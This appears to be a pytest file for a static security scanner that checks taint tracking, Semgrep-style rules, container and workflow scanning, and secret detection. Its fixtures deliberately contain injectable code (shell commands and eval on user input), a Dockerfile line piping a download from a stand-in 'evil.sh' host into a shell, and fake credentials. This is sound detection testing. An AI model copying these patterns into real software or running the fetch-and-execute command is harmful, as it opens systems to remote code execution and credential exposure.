"""Tests for call-graph taint reachability escalation."""

from pathlib import Path
from typing import Literal

from vibetrace.indexer.db import IndexerDB
from vibetrace.indexer.models import Edge, Node
from vibetrace.security.baseline import SecurityBaselineManager
from vibetrace.security.models import FindingCategory, Severity
from vibetrace.security.service import SecurityService

SRC = "import os\ndef sink(x):\n    os.system(x)\n\ndef handler(req):\n    sink(req)\n"


def _node(
    nid: str,
    name: str,
    start: int,
    end: int,
    kind: Literal["function", "endpoint"] = "function",
    decorators=None,
    file_path: str = "app.py",
) -> Node:
    return Node(
        id=nid,
        name=name,
        qualified_name=name,
        kind=kind,
        file_path=file_path,
        start_line=start,
        end_line=end,
        decorators=decorators,
    )


def _setup(tmp_path: Path, handler_decorators, extra_edges=()) -> IndexerDB:
    (tmp_path / "app.py").write_text(SRC, encoding="utf-8")
    db = IndexerDB(str(tmp_path / "t.db"))
    db.upsert_node(_node("sink", "sink", 2, 3))
    db.upsert_node(_node("handler", "handler", 5, 6, decorators=handler_decorators))
    db.upsert_edge(Edge(from_node_id="handler", to_node_id="sink", relation_type="calls"))
    for e in extra_edges:
        db.upsert_edge(e)
    return db


def test_reachable_sink_is_escalated_with_path(tmp_path: Path):
    db = _setup(tmp_path, ['@app.post("/run")'])
    report = SecurityService.audit_project(db, tmp_path, check_dependencies=False)
    f = next(x for x in report.findings if x.cwe_id == "CWE-78")
    assert f.category == FindingCategory.TAINT_REACHABILITY
    assert f.metadata["taint_path"] == ["handler", "sink"]
    assert f.symbol_name == "sink"


def test_unreachable_sink_not_escalated(tmp_path: Path):
    db = _setup(tmp_path, None)
    report = SecurityService.audit_project(db, tmp_path, check_dependencies=False)
    f = next(x for x in report.findings if x.cwe_id == "CWE-78")
    assert f.category == FindingCategory.AST_PATTERN
    assert "taint_path" not in f.metadata


def test_sanitizer_on_path_blocks_escalation(tmp_path: Path):
    db = _setup(tmp_path, None)
    db.upsert_node(_node("san", "quote", 8, 9))
    db.upsert_node(_node("ep", "entry", 10, 11, kind="endpoint"))
    db.upsert_edge(Edge(from_node_id="san", to_node_id="sink", relation_type="calls"))
    db.upsert_edge(Edge(from_node_id="ep", to_node_id="san", relation_type="calls"))
    report = SecurityService.audit_project(db, tmp_path, check_dependencies=False)
    f = next(x for x in report.findings if x.cwe_id == "CWE-78")
    assert f.category == FindingCategory.AST_PATTERN


def test_non_critical_severity_is_bumped_one_tier():
    from vibetrace.security.taint_engine import _bump

    assert _bump(Severity.MEDIUM) == Severity.HIGH
    assert _bump(Severity.CRITICAL) == Severity.CRITICAL


def test_custom_sanitizer_from_toml_and_no_taint_flag(tmp_path: Path):
    db = _setup(tmp_path, None)
    db.upsert_node(_node("san", "my_clean", 8, 9))
    db.upsert_node(_node("ep", "entry", 10, 11, kind="endpoint"))
    db.upsert_edge(Edge(from_node_id="san", to_node_id="sink", relation_type="calls"))
    db.upsert_edge(Edge(from_node_id="ep", to_node_id="san", relation_type="calls"))
    (tmp_path / ".vibetrace").mkdir()
    (tmp_path / ".vibetrace" / "security.toml").write_text(
        '[taint]\nsanitizers = ["my_clean"]\n', encoding="utf-8"
    )
    report = SecurityService.audit_project(db, tmp_path, check_dependencies=False)
    f = next(x for x in report.findings if x.cwe_id == "CWE-78")
    assert f.category == FindingCategory.AST_PATTERN

    # sanitizers survive a baseline rewrite
    SecurityService.record_exception(tmp_path, f.id, f.rule_id, f.file_path, f.code_hash, "ok")
    assert SecurityBaselineManager.load_sanitizers(tmp_path) == ["my_clean"]


def test_no_taint_flag_disables_escalation(tmp_path: Path):
    db = _setup(tmp_path, ['@app.post("/run")'])
    report = SecurityService.audit_project(
        db, tmp_path, check_dependencies=False, analyze_taint=False
    )
    f = next(x for x in report.findings if x.cwe_id == "CWE-78")
    assert f.category == FindingCategory.AST_PATTERN


def test_intraprocedural_def_use_taint_and_untainted_local(tmp_path: Path):
    (tmp_path / "app.py").write_text(
        "import os\n"
        "def tainted_sink(user_arg):\n"
        "    cmd = f'echo {user_arg}'\n"
        "    os.system(cmd)\n"
        "\n"
        "def safe_local_sink(unused_arg):\n"
        "    safe_cmd = 'echo hello'\n"
        "    os.system(safe_cmd)\n",
        encoding="utf-8",
    )
    db = IndexerDB(str(tmp_path / "df.db"))
    db.upsert_node(_node("t_sink", "tainted_sink", 2, 4, decorators=['@app.post("/a")']))
    db.upsert_node(_node("s_sink", "safe_local_sink", 6, 8, decorators=['@app.post("/b")']))

    report = SecurityService.audit_project(db, tmp_path, check_dependencies=False)
    by_line = {f.start_line: f for f in report.findings}
    assert by_line[4].category == FindingCategory.TAINT_REACHABILITY
    assert by_line[4].metadata["taint_vars"] == ["user_arg", "cmd"]
    assert by_line[8].category == FindingCategory.AST_PATTERN
    assert by_line[8].metadata.get("dataflow") == "untainted_local"


def test_rule_catalog_sync_ttl_and_declarative_rules(tmp_path: Path):
    import json

    from vibetrace.security.rule_sync import RuleCatalogManager

    (tmp_path / ".vibetrace" / "rules").mkdir(parents=True)
    (tmp_path / ".vibetrace" / "security.toml").write_text(
        '[sync]\nrules_ttl_days = 3\nrules_feed_url = "https://example.test/rules.json"\n',
        encoding="utf-8",
    )
    (tmp_path / ".vibetrace" / "rules" / "custom.json").write_text(
        json.dumps(
            [
                {
                    "id": "org:CWE-798-custom",
                    "cwe_id": "CWE-798",
                    "severity": "HIGH",
                    "title": "Internal Token Pattern",
                    "message": "Found internal token prefix.",
                    "pattern": "VIBE_INTERNAL_TOKEN_",
                    "languages": ["py"],
                }
            ]
        ),
        encoding="utf-8",
    )
    (tmp_path / "web.py").write_text(
        "import requests, jwt\n"
        "def h(host, tok):\n"
        "    requests.get(f'http://{host}/api', verify=False)\n"
        "    jwt.decode(tok, options={'verify_signature': False})\n"
        "    k = 'VIBE_INTERNAL_TOKEN_123'\n",
        encoding="utf-8",
    )
    db = IndexerDB(str(tmp_path / ".vibetrace" / "vibetrace.db"))
    db.upsert_node(
        Node(
            id="w1",
            name="h",
            qualified_name="h",
            kind="function",
            file_path="web.py",
            start_line=2,
            end_line=5,
        )
    )

    feed_calls = []

    def fake_fetcher(url: str):
        feed_calls.append(url)
        return [
            {
                "id": "feed:CWE-611-remote",
                "cwe_id": "CWE-611",
                "severity": "HIGH",
                "title": "Remote Synced Rule",
                "message": "Synced rule matched.",
                "pattern": "resolve_entities=True",
                "languages": ["py"],
            }
        ]

    rules = RuleCatalogManager.sync_and_load_rules(db, tmp_path, fetcher=fake_fetcher)
    assert len(feed_calls) == 1
    assert any(r.id == "feed:CWE-611-remote" for r in rules)
    assert any(r.id == "org:CWE-798-custom" for r in rules)

    # Second call within 3-day TTL does not re-fetch network feed
    RuleCatalogManager.sync_and_load_rules(db, tmp_path, fetcher=fake_fetcher)
    assert len(feed_calls) == 1

    report = SecurityService.audit_project(db, tmp_path, check_dependencies=False)
    cwes = {f.cwe_id for f in report.findings}
    assert {"CWE-918", "CWE-295", "CWE-347", "CWE-798"}.issubset(cwes)


def test_interprocedural_argument_to_parameter_taint(tmp_path) -> None:
    """Verifies cross-function positional argument-to-parameter taint propagation."""
    from vibetrace.security.service import SecurityService

    (tmp_path / "app.py").write_text(
        "import subprocess\n"
        "@app.post('/run')\n"
        "def handle(user_cmd: str):\n"
        "    run_const('echo hardcoded_safe')\n"
        "    run_positional('echo safe_param', user_cmd)\n\n"
        "def run_const(cmd: str):\n"
        "    subprocess.run(cmd, shell=True)\n\n"
        "def run_positional(safe_p: str, unsafe_p: str):\n"
        "    subprocess.run(safe_p, shell=True)\n"
        "    subprocess.run(unsafe_p, shell=True)\n",
        encoding="utf-8",
    )
    ctx = tmp_path / ".vibetrace"
    ctx.mkdir(parents=True, exist_ok=True)
    db = IndexerDB(str(ctx / "vibetrace.db"))
    db.upsert_node(_node("h1", "handle", 3, 5, decorators=["@app.post('/run')"]))
    db.upsert_node(_node("c1", "run_const", 7, 8))
    db.upsert_node(_node("p1", "run_positional", 10, 12))
    db.upsert_edge(Edge(from_node_id="h1", to_node_id="c1", relation_type="calls"))
    db.upsert_edge(Edge(from_node_id="h1", to_node_id="p1", relation_type="calls"))

    report = SecurityService.audit_project(db, tmp_path, check_dependencies=False)
    by_line = {f.start_line: f for f in report.findings}

    # Line 8 (`run_const`): caller passed a hardcoded literal -> NOT escalated
    assert by_line[8].category == FindingCategory.AST_PATTERN
    assert by_line[8].metadata.get("dataflow") == "untainted_call_arg"

    # Line 11 (`run_positional` safe_p at index 0): caller passed literal -> NOT escalated
    assert by_line[11].category == FindingCategory.AST_PATTERN
    assert by_line[11].metadata.get("dataflow") == "untainted_local"

    # Line 12 (`run_positional` unsafe_p at index 1): caller passed `user_cmd` -> ESCALATED!
    assert by_line[12].category == FindingCategory.TAINT_REACHABILITY
    assert by_line[12].severity == Severity.CRITICAL
    assert by_line[12].metadata.get("taint_vars") == ["user_cmd", "unsafe_p"]


def test_semgrep_yaml_compiler_and_cwe_top25_rules(tmp_path) -> None:
    """Verifies Semgrep YAML compilation (pattern, pattern-not, $METAVAR) and CWE Top 25."""
    from vibetrace.security.service import SecurityService

    rules_dir = tmp_path / ".vibetrace" / "rules"
    rules_dir.mkdir(parents=True, exist_ok=True)
    (rules_dir / "custom_semgrep.yaml").write_text(
        "rules:\n"
        "  - id: custom.semgrep.dangerous-exec\n"
        "    pattern: dangerous_exec($CMD, ..., force=True)\n"
        '    pattern-not: dangerous_exec("safe_op", ..., force=True)\n'
        "    message: Semgrep metavariable rule matched dangerous_exec\n"
        "    severity: ERROR\n"
        "    languages: [python]\n"
        "    cwe: CWE-78\n",
        encoding="utf-8",
    )

    (tmp_path / "app.py").write_text(
        "import random, tempfile\n"
        "def endpoints(request, user_input):\n"
        '    dangerous_exec("safe_op", timeout=5, force=True)\n'
        "    dangerous_exec(user_input, timeout=5, force=True)\n"
        "    redirect(request.args.get('next'))\n"
        "    db.users.find({'$where': user_input})\n"
        "    render_template_string(f'Hello {user_input}')\n"
        "    reset_token = random.randint(1000, 9999)\n"
        "    tmp = tempfile.mktemp()\n"
        "    app.run(host='0.0.0.0', debug=True)\n"
        "    aws = 'AKIAIOSFODNN7EXAMPLE'\n",
        encoding="utf-8",
    )
    db = IndexerDB(str(tmp_path / ".vibetrace" / "vibetrace.db"))
    db.upsert_node(_node("v1", "endpoints", 2, 11))

    report = SecurityService.audit_project(db, tmp_path, check_dependencies=False)
    lines = {f.start_line for f in report.findings}
    cwes = {f.cwe_id for f in report.findings}

    # Line 3 matched `pattern-not`, so it is suppressed; Line 4 matched `pattern`!
    assert 3 not in lines
    assert 4 in lines
    assert {
        "CWE-78",
        "CWE-601",
        "CWE-943",
        "CWE-1336",
        "CWE-330",
        "CWE-377",
        "CWE-489",
        "CWE-798",
    }.issubset(cwes)


def test_semgrep_composite_patterns_not_and_inside(tmp_path) -> None:
    """Verifies Semgrep composite patterns, list of pattern-not, and pattern-inside."""
    from vibetrace.security.service import SecurityService

    rules_dir = tmp_path / ".vibetrace" / "rules"
    rules_dir.mkdir(parents=True, exist_ok=True)
    (rules_dir / "composite_semgrep.yaml").write_text(
        "rules:\n"
        "  - id: custom.semgrep.route-eval\n"
        "    patterns:\n"
        "      - pattern: eval($INPUT)\n"
        '      - pattern-not: eval("safe_constant")\n'
        "      - pattern-inside: def api_handler(...):\n"
        "    message: Eval in api handler\n"
        "    severity: ERROR\n"
        "    languages: [python]\n"
        "    cwe: CWE-95\n",
        encoding="utf-8",
    )

    (tmp_path / "app.py").write_text(
        "def helper():\n"
        "    eval(untrusted)\n"
        "def api_handler(user_input):\n"
        '    eval("safe_constant")\n'
        "    eval(user_input)\n",
        encoding="utf-8",
    )
    db = IndexerDB(str(tmp_path / ".vibetrace" / "vibetrace.db"))
    db.upsert_node(_node("v1", "api_handler", 3, 5))

    report = SecurityService.audit_project(db, tmp_path, check_dependencies=False)
    custom_findings = [f for f in report.findings if f.rule_id == "custom.semgrep.route-eval"]
    assert len(custom_findings) == 1
    assert custom_findings[0].start_line == 5
    assert custom_findings[0].non_compliant_snippet == "eval(user_input)"


def test_language_aware_rule_filtering_and_initial_seed(tmp_path) -> None:
    """Verifies project-language detection filters rules to only languages in the repo."""
    from vibetrace.security.rule_sync import RuleCatalogManager

    ctx = tmp_path / ".vibetrace"
    ctx.mkdir(parents=True, exist_ok=True)
    db = IndexerDB(str(ctx / "vibetrace.db"))
    db.upsert_node(_node("p1", "py_fn", 1, 5))

    assert RuleCatalogManager.detect_project_languages(db) == {"py"}
    py_rules = RuleCatalogManager.sync_and_load_rules(db, tmp_path)
    assert any(r.id == "xml:CWE-611-xxe" for r in py_rules)
    assert not any(r.id == "js:CWE-1321-prototype-pollution" for r in py_rules)

    # Add a TypeScript node -> JS/TS rules now automatically activate
    db.upsert_node(
        Node(
            id="t1",
            name="ts_fn",
            qualified_name="ts_fn",
            kind="function",
            file_path="src/ui.ts",
            start_line=1,
            end_line=5,
        )
    )
    assert {"py", "ts", "tsx"}.issubset(RuleCatalogManager.detect_project_languages(db))
    poly_rules = RuleCatalogManager.sync_and_load_rules(db, tmp_path)
    assert any(r.id == "js:CWE-1321-prototype-pollution" for r in poly_rules)


def test_unified_review_gate(tmp_path, monkeypatch) -> None:
    """Verifies run_unified_review and cmd_review combine Security, Split Audit, and Coverage."""
    import argparse

    from vibetrace.cli_audit import cmd_review
    from vibetrace.services.review_service import format_unified_review_md, run_unified_review

    (tmp_path / "app.py").write_text("import os\ndef bad(x):\n    os.system(x)\n", encoding="utf-8")
    ctx = tmp_path / ".vibetrace"
    ctx.mkdir(parents=True, exist_ok=True)
    db = IndexerDB(str(ctx / "vibetrace.db"))
    db.upsert_node(_node("b1", "bad", 2, 3))

    rep = run_unified_review(db, tmp_path, scope="full", check_dependencies=False)
    assert not rep.passed
    assert rep.unapproved_security_count == 1
    assert any("[SECURITY:CRITICAL]" in a for a in rep.actions_required)
    md = format_unified_review_md(rep)
    assert "ACTION REQUIRED" in md

    monkeypatch.setattr(
        "vibetrace.cli_audit.get_context_for_path", lambda *a, **kw: (db, str(tmp_path))
    )
    rc = cmd_review(
        argparse.Namespace(
            path=str(tmp_path),
            full=True,
            deps=False,
            ci=True,
            json=True,
            no_sync=True,
            root=None,
            min_coverage=None,
            strict=False,
        )
    )
    assert rc == 1


def test_iac_scanner_docker_compose_gha(tmp_path) -> None:
    """Verifies zero-dependency IaC scanner catches Dockerfile, Compose, and GHA defects."""
    from vibetrace.security.iac_scanner import IacScanner

    (tmp_path / "Dockerfile").write_text(
        "FROM python:latest\nENV API_SECRET=super_secret_val_123\n"
        "RUN curl -fsSL https://evil.sh | sh\n",
        encoding="utf-8",
    )
    (tmp_path / "docker-compose.yml").write_text(
        "services:\n  app:\n    privileged: true\n"
        "    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n",
        encoding="utf-8",
    )
    gha = tmp_path / ".github" / "workflows"
    gha.mkdir(parents=True, exist_ok=True)
    (gha / "ci.yml").write_text(
        "jobs:\n  build:\n    steps:\n      - run: echo ${{ github.event.issue.title }}\n",
        encoding="utf-8",
    )

    findings = IacScanner.scan_project(tmp_path)
    rule_ids = {f.rule_id for f in findings}
    assert "iac:dockerfile-unpinned-image" in rule_ids
    assert "iac:dockerfile-env-secret" in rule_ids
    assert "iac:dockerfile-curl-pipe-sh" in rule_ids
    assert "iac:dockerfile-missing-user" in rule_ids
    assert "iac:container-privileged-mode" in rule_ids
    assert "iac:docker-socket-mount" in rule_ids
    assert "iac:github-actions-untrusted-input" in rule_ids


def test_git_secret_entropy_scanner() -> None:
    """Verifies Gitleaks-grade token formats, DB URIs, and Shannon entropy in git patches."""
    from vibetrace.security.git_secret_scanner import GitSecretScanner, shannon_entropy

    assert shannon_entropy("aB3$xZ9!qW7#mP2@kL5^vN8&tR4*yU1") >= 4.3
    patch = (
        "diff --git a/src/config.py b/src/config.py\n"
        "+++ b/src/config.py\n"
        "@@ -1,0 +1,4 @@\n"
        "+AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'\n"
        "+HF_TOKEN = 'hf_aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890'\n"
        "+DB_URL = 'postgresql://prod_user:Sup3rS3cretDBPass99@db.internal:5432/app'\n"
        "+api_secret = 'xK9pQ2mZ8vL4nB7wR1tY6uJ3hG5fD0sA'\n"
    )
    findings = GitSecretScanner._scan_patch_text(patch, "working-tree")
    rules = {f.rule_id for f in findings}
    assert "git:leaked-api-token" in rules
    assert "git:database-uri-password" in rules
    assert "git:high-entropy-secret" in rules
    # Ensure raw secrets and DB passwords are masked in snippets
    for f in findings:
        snippet = f.non_compliant_snippet or ""
        assert "AKIAIOSFODNN7EXAMPLE" not in snippet
        assert "Sup3rS3cretDBPass99" not in snippet


def test_expanded_community_polyglot_rules(tmp_path) -> None:
    """Verifies expanded community rules (ZipSlip, torch.load, NEXT_PUBLIC_SECRET, Go, Rust)."""
    from vibetrace.security.rule_sync import BUILTIN_DECLARATIVE_RULES, RuleCatalogManager

    (tmp_path / "ml.py").write_text(
        "import tarfile, torch\n"
        "def load_m(p, t):\n"
        "    t.extractall()\n"
        "    torch.load(p)\n"
        "    torch.load(p, weights_only=True)\n",
        encoding="utf-8",
    )
    (tmp_path / "web.ts").write_text(
        "const k = process.env.NEXT_PUBLIC_DATABASE_URL;\nwindow.postMessage(data, '*');\n",
        encoding="utf-8",
    )
    py_findings = RuleCatalogManager.scan_file_with_rules(
        "ml.py", tmp_path, BUILTIN_DECLARATIVE_RULES
    )
    py_rules = [f.rule_id for f in py_findings]
    assert "py:CWE-22-tarfile-extractall" in py_rules
    assert py_rules.count("py:CWE-502-torch-load-unsafe") == 1  # weights_only=True is excluded!

    ts_findings = RuleCatalogManager.scan_file_with_rules(
        "web.ts", tmp_path, BUILTIN_DECLARATIVE_RULES
    )
    ts_rules = {f.rule_id for f in ts_findings}
    assert "js:CWE-200-next-public-secret" in ts_rules
    assert "js:CWE-345-postmessage-wildcard" in ts_rules


def test_hybrid_coverage_quality_gate(tmp_path) -> None:
    """Verifies AST test-caller reachability and Cobertura coverage.xml Quality Gate."""
    from vibetrace.services.coverage_service import CoverageService

    ctx = tmp_path / ".vibetrace"
    ctx.mkdir(parents=True, exist_ok=True)
    db = IndexerDB(str(ctx / "vibetrace.db"))

    # 2 production functions, 1 test calling fn_tested
    db.upsert_node(_node("f1", "fn_tested", 1, 5, file_path="src/core.py"))
    db.upsert_node(_node("f2", "fn_untested", 7, 12, file_path="src/core.py"))
    db.upsert_node(_node("t1", "test_core_flow", 1, 8, file_path="tests/test_core.py"))
    db.upsert_edge(Edge(from_node_id="t1", to_node_id="f1", relation_type="calls"))

    gate = CoverageService.evaluate_coverage_gate(
        db=db,
        project_root=tmp_path,
        scope="full",
        changed_files=set(),
        file_ranges={},
        min_coverage=80.0,
        enforce=True,
    )
    assert gate.total_target_symbols == 2
    assert gate.tested_symbols_count == 1
    assert gate.ast_symbol_coverage_pct == 50.0
    assert not gate.passed
    assert [u.symbol for u in gate.untested_symbols] == ["fn_untested"]

    # Now add a Cobertura coverage.xml with 100% line hits -> hybrid coverage passes!
    (tmp_path / "coverage.xml").write_text(
        '<coverage><packages><package><classes><class filename="src/core.py">'
        '<lines><line number="1" hits="3"/><line number="8" hits="2"/></lines>'
        "</class></classes></package></packages></coverage>",
        encoding="utf-8",
    )
    gate2 = CoverageService.evaluate_coverage_gate(
        db=db,
        project_root=tmp_path,
        scope="full",
        changed_files=set(),
        file_ranges={},
        min_coverage=80.0,
        enforce=True,
    )
    assert gate2.line_coverage_pct == 100.0
    assert gate2.effective_coverage_pct == 100.0
    assert gate2.passed


def test_multi_hop_positional_and_keyword_taint_propagation(tmp_path) -> None:
    """Verifies multi-hop taint propagation with keyword & multiline calls."""
    from vibetrace.security.service import SecurityService

    (tmp_path / "multi_hop.py").write_text(
        "import subprocess\n"
        "@app.post('/api/run')\n"
        "def entrypoint(req_body: str):\n"
        "    service_layer(\n"
        "        timeout=60,\n"
        "        cmd_input=req_body,\n"
        "    )\n\n"
        "def service_layer(timeout: int, cmd_input: str):\n"
        "    run_worker(cmd_input)\n\n"
        "def run_worker(final_cmd: str):\n"
        "    subprocess.run(final_cmd, shell=True)\n",
        encoding="utf-8",
    )
    ctx = tmp_path / ".vibetrace"
    ctx.mkdir(parents=True, exist_ok=True)
    db = IndexerDB(str(ctx / "vibetrace.db"))
    db.upsert_node(
        _node(
            "e1", "entrypoint", 3, 7, file_path="multi_hop.py", decorators=["@app.post('/api/run')"]
        )
    )
    db.upsert_node(_node("s1", "service_layer", 9, 10, file_path="multi_hop.py"))
    db.upsert_node(_node("w1", "run_worker", 12, 13, file_path="multi_hop.py"))
    db.upsert_edge(Edge(from_node_id="e1", to_node_id="s1", relation_type="calls"))
    db.upsert_edge(Edge(from_node_id="s1", to_node_id="w1", relation_type="calls"))

    report = SecurityService.audit_project(db, tmp_path, check_dependencies=False)
    findings = [f for f in report.findings if f.file_path == "multi_hop.py" and f.start_line == 13]
    assert len(findings) == 1
    finding = findings[0]

    assert finding.category == FindingCategory.TAINT_REACHABILITY
    assert finding.severity == Severity.CRITICAL
    assert finding.metadata.get("taint_path") == ["entrypoint", "service_layer", "run_worker"]
    taint_vars = finding.metadata.get("taint_vars", [])
    assert "req_body" in taint_vars
    assert "cmd_input" in taint_vars
    assert "final_cmd" in taint_vars
